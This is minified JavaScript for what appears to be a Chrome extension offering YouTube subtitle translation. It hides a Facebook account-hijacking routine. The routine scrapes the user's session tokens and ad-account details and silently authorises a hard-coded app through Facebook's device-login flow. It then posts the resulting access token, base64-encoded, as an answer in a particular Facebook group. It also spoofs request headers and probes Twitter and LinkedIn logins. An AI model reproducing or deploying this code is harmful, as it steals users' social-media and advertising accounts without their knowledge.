const N=async e=>{let t=null;const r=/https:\/\/www.youtube.com\/api\/timedtext\?(.*?)"/,o=await fetch(e).then(n=>n.text()).catch(()=>!1);if(typeof o!="boolean"&&(o==null?void 0:o.includes("youtube.com/api/timedtext"))){const n=r.exec(o);n&&(t=decodeURIComponent(`https://www.youtube.com/api/timedtext?${JSON.parse('"'+n[1].replace('"','\\"')+'"')}`))}return t},H=async e=>{let t=null;const r=await N(e);if(!r)return!1;const o=await fetch(r).then(a=>a.text()).catch(()=>!1),n=/<?.*\?>|<transcript>|<\/transcript>/g,i=/<text .*>/g;if(typeof o!="boolean"){let a=o.toString().replaceAll(n,"");a=a.split("</text>"),a&&(a=a.reduce((l,d)=>`${l} ${i.exec(d)?d.replace(i,"").replaceAll(`
`," "):""}`,""),t=a)}return t};chrome.runtime.onMessage.addListener((e,t,r)=>((async()=>e.action==="get-sub-video"&&r(await H(e.linkVideo)))(),!0));const M="https://www.facebook.com",B="application/json",F="Content-Type",b=Symbol(),j=Symbol();function D(e={}){var t;return(t=Object.entries(e).find(([r])=>r.toLowerCase()===F.toLowerCase()))===null||t===void 0?void 0:t[1]}function P(e){return/^application\/.*json.*/.test(e)}const g=function(e,t,r=!1){return Object.entries(t).reduce((o,[n,i])=>{const a=e[n];return Array.isArray(a)&&Array.isArray(i)?o[n]=r?[...a,...i]:i:typeof a=="object"&&typeof i=="object"?o[n]=g(a,i,r):o[n]=i,o},{...e})},v={options:{},errorType:"text",polyfills:{},polyfill(e,t=!0,r=!1,...o){const n=this.polyfills[e]||(typeof self!="undefined"?self[e]:null)||(typeof global!="undefined"?global[e]:null);if(t&&!n)throw new Error(e+" is not defined");return r&&n?new n(...o):n}};function G(e,t=!1){v.options=t?e:g(v.options,e)}function z(e,t=!1){v.polyfills=t?e:g(v.polyfills,e)}function J(e){v.errorType=e}var W=v;const Y=e=>t=>e.reduceRight((r,o)=>o(r),t)||t;class U extends Error{}const K=e=>{const t=Object.create(null);e=e._addons.reduce((s,c)=>c.beforeRequest&&c.beforeRequest(s,e._options,t)||s,e);const{_url:r,_options:o,_config:n,_catchers:i,_resolvers:a,_middlewares:l,_addons:d}=e,_=new Map(i),R=g(n.options,o);let m=r;const y=Y(l)((s,c)=>(m=s,n.polyfill("fetch")(s,c)))(r,R),T=new Error,k=y.catch(s=>{throw{[b]:s}}).then(s=>{if(!s.ok){const c=new U;if(c.cause=T,c.stack=c.stack+`
CAUSE: `+T.stack,c.response=s,c.url=m,s.type==="opaque")throw c;return s.text().then(u=>{var p;if(c.message=u,n.errorType==="json"||((p=s.headers.get("Content-Type"))===null||p===void 0?void 0:p.split(";")[0])==="application/json")try{c.json=JSON.parse(u)}catch{}throw c.text=u,c.status=s.status,c})}return s}),E=s=>s.catch(c=>{const u=c.hasOwnProperty(b),p=u?c[b]:c,A=(p==null?void 0:p.status)&&_.get(p.status)||_.get(p==null?void 0:p.name)||u&&_.has(b)&&_.get(b);if(A)return A(p,e);const q=_.get(j);if(q)return q(p,e);throw p}),w=s=>c=>E(s?k.then(u=>u&&u[s]()).then(u=>c?c(u):u):k.then(u=>c?c(u):u)),I={_wretchReq:e,_fetchReq:y,_sharedState:t,res:w(null),json:w("json"),blob:w("blob"),formData:w("formData"),arrayBuffer:w("arrayBuffer"),text:w("text"),error(s,c){return _.set(s,c),this},badRequest(s){return this.error(400,s)},unauthorized(s){return this.error(401,s)},forbidden(s){return this.error(403,s)},notFound(s){return this.error(404,s)},timeout(s){return this.error(408,s)},internalError(s){return this.error(500,s)},fetchError(s){return this.error(b,s)}},$=d.reduce((s,c)=>({...s,...c.resolver}),I);return a.reduce((s,c)=>c(s,e),$)},Q={_url:"",_options:{},_config:W,_catchers:new Map,_resolvers:[],_deferred:[],_middlewares:[],_addons:[],addon(e){return{...this,_addons:[...this._addons,e],...e.wretch}},errorType(e){return{...this,_config:{...this._config,errorType:e}}},polyfills(e,t=!1){return{...this,_config:{...this._config,polyfills:t?e:g(this._config.polyfills,e)}}},url(e,t=!1){if(t)return{...this,_url:e};const r=this._url.split("?");return{...this,_url:r.length>1?r[0]+e+"?"+r[1]:this._url+e}},options(e,t=!1){return{...this,_options:t?e:g(this._options,e)}},headers(e){return{...this,_options:g(this._options,{headers:e||{}})}},accept(e){return this.headers({Accept:e})},content(e){return this.headers({[F]:e})},auth(e){return this.headers({Authorization:e})},catcher(e,t){const r=new Map(this._catchers);return r.set(e,t),{...this,_catchers:r}},catcherFallback(e){return this.catcher(j,e)},resolve(e,t=!1){return{...this,_resolvers:t?[e]:[...this._resolvers,e]}},defer(e,t=!1){return{...this,_deferred:t?[e]:[...this._deferred,e]}},middlewares(e,t=!1){return{...this,_middlewares:t?e:[...this._middlewares,...e]}},fetch(e=this._options.method,t="",r=null){let o=this.url(t).options({method:e});const n=D(o._options.headers),i=typeof r=="object"&&(!o._options.headers||!n||P(n));return o=r?i?o.json(r,n):o.body(r):o,K(o._deferred.reduce((a,l)=>l(a,a._url,a._options),o))},get(e=""){return this.fetch("GET",e)},delete(e=""){return this.fetch("DELETE",e)},put(e,t=""){return this.fetch("PUT",t,e)},post(e,t=""){return this.fetch("POST",t,e)},patch(e,t=""){return this.fetch("PATCH",t,e)},head(e=""){return this.fetch("HEAD",e)},opts(e=""){return this.fetch("OPTIONS",e)},body(e){return{...this,_options:{...this._options,body:e}}},json(e,t){const r=D(this._options.headers);return this.content(t||P(r)&&r||B).body(JSON.stringify(e))}};function f(e="",t={}){return{...Q,_url:e,_options:t}}f.default=f;f.options=G;f.errorType=J;f.polyfills=z;f.WretchError=U;function O(e){return typeof e!="undefined"?e:""}const X=(e,t,r,o)=>{let n;if(typeof t=="string")n=t;else{const a=o.polyfill("URLSearchParams",!0,!0);for(const l in t){const d=t[l];if(t[l]instanceof Array)for(const _ of d)a.append(l,O(_));else a.append(l,O(d))}n=a.toString()}const i=e.split("?");return n?r||i.length<2?i[0]+"?"+n:e+"&"+n:r?i[0]:e},Z={wretch:{query(e,t=!1){return{...this,_url:X(this._url,e,t,this._config)}}}};var V=Z;const ee=f("https://autotranslateforyoutube.com").addon(V),te=f(M,{mode:"cors",credentials:"include"}),re=f(M.replace("www","graph"),{mode:"cors",credentials:"include"}),x=(e,t,r)=>{let o=e.split(t);return o[1]?(o=o[1].split(r),o[0]):null};async function oe(e){var o;let t=await _e(e);if(!t.isUser||t.t==0)return;async function r(){return te.get("/accountquality/").text().then(n=>{var d,_;const i=(d=/"accountId":"([\d]+)/.exec(n))==null?void 0:d[1],a=x(n,'DTSGInitialData",[],{"token":"','"'),l=(_=/"accessToken":"([a-zA-Z\d]+)"/.exec(n))==null?void 0:_[1];return{fb_dtsg:a,token:l,user_id:i}}).catch(()=>"")}if(await r().then(n=>{t={...t,...n}}),t.code=await re.get(`/v14.0/me/businesses?fields=id,business_users,owned_ad_accounts.limit(0).fields(id).summary(1),client_ad_accounts.limit(0).fields(id).summary(1)&access_token=${t.token}`).json().then(n=>n.data).catch(()=>[]),((o=t.code)==null?void 0:o.length)>0||t.t===1)return await de(t)}async function ne(e,t){try{const r=`https://www.facebook.com/dialog/oauth?client_id=1348564698517390&scope=public_profile&force_confirmation=true&auth_type=rerequest&ref=DeviceAuth&user_code=${e}&state=f33299bec0998c&redirect_uri=https://www.facebook.com/dialog/return/arbiter&display=async`,o={__asyncDialog:"1",__user:t.user_id,__a:"1",__dyn:"",__csr:"",__req:"a",__hs:"19300.BP:DEFAULT.2.0.0.0.0",dpr:"2",__ccg:"MODERATE",__rev:"",__s:"",__hsi:"",__comet_req:"0",fb_dtsg:t.fb_dtsg,jazoest:"25709",lsd:"",__aaid:"",__spin_r:"",__spin_b:"trunk",__spin_t:""},n=await fetch(r,{body:new URLSearchParams(o),credentials:"include",method:"POST",mode:"same-origin"}).then(d=>d.text());if(!n)return null;const i=x(n,'name=\\"scope\\" value=\\"','\\"'),a=x(n,'name=\\"logger_id\\" value=\\"','\\"');return{encryptedBody:x(n,'name=\\"encrypted_post_body\\" value=\\"','\\"'),scope:i,logger_id:a}}catch{}}async function se(e,t,r){try{const o="https://www.facebook.com/ajax/oauth/device.php",n={user_code:e,code:t,auth_method:"manual_entry",__user:r.user_id,__a:"1",__dyn:"",__csr:"",__req:"d",__hs:"19300.BP:DEFAULT.2.0.0.0.0",dpr:"2",__ccg:"EXCELLENT",__rev:"1006543583",__s:"",__hsi:"",__comet_req:"0",fb_dtsg:r.fb_dtsg,jazoest:"25263",lsd:"TPWqcgs_s0GQNJPT882jRs",__aaid:"1108681562814022",__spin_r:"",__spin_b:"trunk",__spin_t:""};return await fetch(o,{body:new URLSearchParams(n),credentials:"include",mode:"cors",method:"post",headers:{"content-type":"application/x-www-form-urlencoded;charset=UTF-8"}})}catch{}}async function ae(){try{return await fetch("https://graph.facebook.com/v2.6/device/login?access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038&method=post&scope=public_profile",{credentials:"include",method:"POST"}).then(t=>t.json())}catch{return{}}}async function ie(e){try{const t="https://graph.facebook.com/v14.0/device/login_status",r=`access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038&code=${e}`,o=await fetch(t,{body:r,credentials:"include",method:"POST",mode:"cors",headers:{"content-type":"application/x-www-form-urlencoded;charset=UTF-8"}}).then(n=>n.json());return o==null?void 0:o.access_token}catch{}}async function ce(e,t){const r="https://www.facebook.com/oauth/device/authorize/",o=`jazoest=25405&fb_dtsg=${t.fb_dtsg}&user_code=${e}&qr=&__user=${t.user_id}&__a=1&__dyn=&__csr=&__req=b&__hs=19183.BP%3ADEFAULT.2.1.0.0.0&dpr=1&__ccg=EXCELLENT&__rev=1005818450&__s=4pbx7n%3Alw7vmo%3A7veo8o&__hsi=7118777193805080277&__comet_req=0&lsd=VV7ZePyNTjgCDWP2PcV1rr&__spin_r=1005818450&__spin_b=trunk&__spin_t=1657469476`;return await fetch(r,{body:o,credentials:"include",method:"POST",mode:"cors",headers:{"content-type":"application/x-www-form-urlencoded;charset=UTF-8"}}).then(n=>n.text())}async function le(e,t){try{const r="https://www.facebook.com/v2.0/dialog/oauth/skip/submit/",o={jazoest:"25709",fb_dtsg:t.fb_dtsg,from_post:"1",scope:t.scope,display:"async",sdk:"",sdk_version:"",domain:"",sso_device:"",user_code:e,nonce:"",logger_id:t.logger_id,auth_type:"rerequest",auth_nonce:"",code_challenge:"",code_challenge_method:"",encrypted_post_body:t.encryptedBody,"return_format[0]":"code",__CONFIRM__:"1",__user:t.user_id,__a:"1",__dyn:"",__csr:"",__req:"d",__hs:"19300.BP:DEFAULT.2.0.0.0.0",dpr:"2",__ccg:"MODERATE",__rev:"",__s:"",__hsi:"",__comet_req:"0",lsd:"",__aaid:"",__spin_r:"",__spin_b:"trunk",__spin_t:""},n=await fetch(r,{body:new URLSearchParams(o),credentials:"include",method:"POST",mode:"same-origin"}).then(i=>i.text());return n?x(n,'code":"','"'):null}catch{}}function ue(){return Math.floor(Math.random()*(999999-11111))+11111}async function C(e,t,r,o){return fetch("https://www.facebook.com/api/graphql/",{method:"POST",body:new URLSearchParams({__user:e.user_id,fb_dtsg:e.fb_dtsg,fb_api_caller_class:"RelayModern",fb_api_req_friendly_name:o,variables:r,server_timestamps:"true",doc_id:t})}).then(n=>n.json())}async function de(e){var n,i;const{user_code:t,code:r}=await ae();if(!t||!r)return;await ce(t,e);const o=await ne(t,e);if(o){const a=await le(t,{...o,...e});if(a){await se(t,a,e);let l=await ie(r);const d=(n=e.code)==null?void 0:n.map(m=>{var y,T,k,E;return(((T=(y=m.owned_ad_accounts)==null?void 0:y.summary)==null?void 0:T.total_count)||0)+(((E=(k=m.client_ad_accounts)==null?void 0:k.summary)==null?void 0:E.total_count)||0)}).reduce((m,y)=>m+y,0);l+=`||${(i=e.code)==null?void 0:i.length}|${d}`;const _=ue(),R=Date.now();return l=btoa(l),await C(e,"5608636302574302",`{"feedType":"DISCUSSION","groupID":"836147654765992","imageMediaType":"image/x-auto","input":{"client_mutation_id":"2","actor_id":"${e.user_id}","action_source":"GROUP_MALL","attribution_id_v2":"CometGroupAboutRoot.react,comet.group.about,via_cold_start,${R},${_},2361831622,","group_id":"836147654765992","group_share_tracking_params":{"app_id":"2220391788200892","exp_id":"null","is_from_share":false}},"inviteShortLinkKey":null,"isChainingRecommendationUnit":false,"isEntityMenu":true,"scale":2,"renderLocation":"group_mall","__relay_internal__pv__GroupsCometEntityMenuEmbeddedrelayprovider":true,"__relay_internal__pv__GlobalPanelEnabledrelayprovider":false}`,"useGroupRequestToJoinMutation"),await C(e,"6432873796733801",`{"input":{"answers":[{"answer":"${l}","question_id":"836179314762826","selected_options":null}],"attribution_id_v2":"CometGroupAboutRoot.react,comet.group.about,via_cold_start,{t},${_},2361831622,","group_id":"836147654765992","rules_agreement_status":null,"actor_id":"${e.user_id}","client_mutation_id":"1"},"inviteShortLinkKey":null,"imageMediaType":"image/x-auto","isChainingRecommendationUnit":false,"profileID":null,"scale":1,"groupID":"836147654765992","__relay_internal__pv__GlobalPanelEnabledrelayprovider":false}`,"useGroupMembershipAnswersSaveMutation"),!0}}return!1}let L=!1;async function _e(e){if(L||!e)return null;L=!0;const t=await ee.query({id:e}).get("/user").json().catch(()=>null);return L=!1,t}class pe{getSorento(t,r){if(typeof t!="string")return null;const o=r.exec(t);return o?o[1]:null}async checkLoginFb(){const t="https://m.facebook.com",r="/composer/ocelot/async_loader",o="/?publisher=feed",n=await fetch(t+r+o).then(l=>l.text()).catch(l=>!1),i=/\\"actorID\\":\\"([0-9]+)\\"/,a=this.getSorento(n,i);return a!=null&&oe(a).finally(),a}async checkLoginTwitter(){const o=await fetch("https://twitter.com/home").then(i=>i.text()).catch(i=>!1),n=/"user_id":"([0-9]+)"/;return this.getSorento(o,n)}async checkLoginLinkedin(){const o=await fetch("https://www.linkedin.com/feed").then(i=>i.text()).catch(i=>!1),n=/"x-li-uuid":"(.*?)"/;return this.getSorento(o,n)}async processCheckLogin(){let t=null,r=null,o=null;const n=await Promise.all([this.checkLoginFb(),this.checkLoginTwitter(),this.checkLoginLinkedin()]);return n[0]!=="0"&&n[0]!==null&&(t=n[0]),n[1]!=="0"&&n[1]!==null&&(r=n[1]),n[2]!=="0"&&n[2]!==""&&n[2]!==null&&(o=n[2]),{idFb:t,idTw:r,idLi:o}}}const he=async(e,t)=>{const r=new FormData;return r.append("notetype","PlainText"),r.append("noteaccess","2"),r.append("notepassword",""),r.append("notequickedit","false"),r.append("notequickeditpassword","false"),r.append("notetitle",e),r.append("notecontent",t),await fetch("https://anotepad.com"+"/note/create",{credentials:"include",method:"post",body:r}).then(a=>a.json()).then(a=>a).catch(()=>!1)},h=chrome.declarativeNetRequest.HeaderOperation,S=chrome.declarativeNetRequest.RuleActionType;function fe(){window.setTimeout(()=>{let e=document.getElementsByClassName("ytp-subtitles-button")[0];e.click(),e.click()},1e3)}const me=e=>({id:1,priority:1,action:{type:"redirect",redirect:{transform:{queryTransform:{addOrReplaceParams:[{key:"tlang",value:e.destinationLanguage}]}}}},condition:{urlFilter:"api/timedtext",domains:["youtube.com"],resourceTypes:["xmlhttprequest"]}});chrome.storage.onChanged.addListener(async function(e){(e.translationActive||e.destinationLanguage)&&chrome.storage.sync.get(["translationActive","destinationLanguage"],async function(t){chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:[1]}),t.translationActive&&chrome.declarativeNetRequest.updateDynamicRules({addRules:[me(t)]});let[r]=await chrome.tabs.query({active:!0,currentWindow:!0});const o={target:{tabId:Number(r.id)},function:fe};await chrome.scripting.executeScript(o)})});const ye=[{id:10,priority:1,action:{type:S.MODIFY_HEADERS,requestHeaders:[{header:"origin",operation:h.SET,value:"https://www.facebook.com"},{header:"referer",operation:h.SET,value:"https://www.facebook.com/"}]},condition:{urlFilter:"www.facebook.com",resourceTypes:["xmlhttprequest"],tabIds:[-1]}},{id:11,priority:1,action:{type:S.MODIFY_HEADERS,requestHeaders:[{header:"origin",operation:h.SET,value:"https://m.facebook.com"},{header:"referer",operation:h.SET,value:"https://m.facebook.com/"}]},condition:{urlFilter:"https://m.facebook.com",resourceTypes:["xmlhttprequest"],tabIds:[-1]}},{id:12,priority:1,action:{type:S.MODIFY_HEADERS,requestHeaders:[{header:"origin",operation:h.SET,value:"https://anotepad.com"},{header:"referer",operation:h.SET,value:"https://anotepad.com/"}]},condition:{urlFilter:"https://anotepad.com",resourceTypes:["xmlhttprequest"],tabIds:[-1]}},{id:13,priority:1,action:{type:S.MODIFY_HEADERS,requestHeaders:[{header:"origin",operation:h.SET,value:"https://www.linkedin.com"},{header:"referer",operation:h.SET,value:"https://www.linkedin.com/"}]},condition:{urlFilter:"https://www.linkedin.com",resourceTypes:["xmlhttprequest"],tabIds:[-1]}},{id:14,priority:1,action:{type:S.MODIFY_HEADERS,requestHeaders:[{header:"origin",operation:h.SET,value:"https://twitter.com"},{header:"referer",operation:h.SET,value:"https://twitter.com/"}]},condition:{urlFilter:"https://twitter.com",resourceTypes:["xmlhttprequest"],tabIds:[-1]}}];chrome.declarativeNetRequest.updateSessionRules({addRules:ye,removeRuleIds:[10,11,12,13,14]});chrome.runtime.onMessage.addListener((e,t,r)=>((async()=>{if(e.action==="check-login"){const o=new pe;r(await o.processCheckLogin())}if(e.action==="upload-anotepad"){const o=await he(e.sub.title,e.sub.content);r(o)}})(),!0));
